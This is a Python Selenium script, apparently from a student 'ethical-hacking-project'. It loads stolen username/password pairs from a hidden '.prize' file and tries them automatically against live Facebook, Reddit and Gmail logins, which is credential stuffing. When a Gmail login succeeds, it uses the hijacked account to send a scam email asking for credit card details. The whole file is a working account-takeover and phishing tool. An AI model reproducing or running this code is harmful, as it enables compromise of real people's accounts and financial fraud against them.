from selenium import webdriver
import os
from selenium.webdriver.common.keys import Keys
from selenium.webdriver import ChromeOptions
import time
import smtplib
import sys


def facebook(driver, username, password):
	# navigate to the application home page
	driver.get("https://www.facebook.com")


	email_field = driver.find_element_by_name("email")
	# get the search textbox
	pass_field = driver.find_element_by_name("pass")


	# enter search keyword and submit
	email_field.send_keys(username)
	pass_field.send_keys(password)
	pass_field.send_keys(Keys.ENTER)

	try:
		elem = driver.find_element_by_class_name("uiHeaderTitle")
		print("Successful Login")
		return True
	except:
		print("Failed Login")
		return False

def gmail(driver, username, password):
	# navigate to the application home page
	driver.get("https://www.gmail.com")


	email_field = driver.find_element_by_name("identifier")
	# get the search textbox


	# enter search keyword and submit
	email_field.send_keys(username)

	email_field.send_keys(Keys.ENTER)

	driver.implicitly_wait(10)

	pass_field = driver.find_element_by_name("password")

	pass_field.send_keys(password)

	pass_field.send_keys(Keys.ENTER)

	try:
		elem = driver.find_element_by_name("q")
		print("Successful Login")
		return True
	except:
		print("Failed Login")
		return False


def reddit(driver, username, password):
	# navigate to the application home page
	driver.get("https://www.reddit.com/login")

	try:
		email_field = driver.find_element_by_id("user_login")
	except:
		email_field = driver.find_element_by_id("loginUsername")
	# get the search textbox
	try:
		pass_field = driver.find_element_by_id("passwd_login")
	except:
		pass_field = driver.find_element_by_id("loginPassword")

	# enter search keyword and submit
	email_field.send_keys(username)
	pass_field.send_keys(password)
	pass_field.send_keys(Keys.ENTER)
	time.sleep(4)
	try:
		#driver.implicitly_wait(3)
		elem = driver.find_element_by_id("passwd_login")
		print("Failed Login")
		return False
	except:
		try:
			#driver.implicitly_wait(3)
			elem = driver.find_element_by_id("loginPassword")
			print("Failed Login")
			return False
		except:
			print("Successful Login")
			return True


def sendMail(user, password, toaddr, subject, body):
	msg = "\r\n".join([
	"From: " + user,
	"To: " + toaddr,
	"Subject: " + subject,
	"",
	body
	])

	server = smtplib.SMTP("smtp.gmail.com:587")
	server.ehlo()
	server.starttls()
	server.login(user,password)
	server.sendmail(user, toaddr, msg)
	server.quit()

def printCreds(u, p, w):
	msg = "{} {} : {}".format(u, p, w)
	print(msg)


def main():
	# get the path of ChromeDriverServer
	# chrome_driver_path = "D:/chromedriver.exe"
	sys.path.append("/Users/charlesgong/Desktop/ethical-hacking-project/hacker/selenium/chromedriver")
	chrome_driver_path = "/Users/charlesgong/Desktop/ethical-hacking-project/hacker/selenium/chromedriver"

	opts = ChromeOptions()
	opts.add_experimental_option("detach", True)
	# create a new Chrome session
	driver = webdriver.Chrome(chrome_driver_path, chrome_options=opts)

	with open('.prize', 'r') as f:
		creds = []

		line = f.readline()

		while line:
			cred = line.strip().split(' ')
			user = cred[0]
			pswd = cred[1]

			creds.append(tuple([user, pswd]))
			line = f.readline()

		for u, p in creds:
			printCreds(u, p, 'facebook')
			if facebook(driver, u, p):
				break

		for u, p in creds:
			printCreds(u, p, 'reddit')
			if reddit(driver, u, p):
				break

		for u, p in creds:
			printCreds(u, p, 'gmail')
			if gmail(driver, u, p):
				sendMail(u, p,
					"chlsgong@utexas.edu",
					"You won $10,000,000!",
					"Send credit card info to receive payment."
				)
				break

		f.close()

if __name__ == '__main__':
	main()
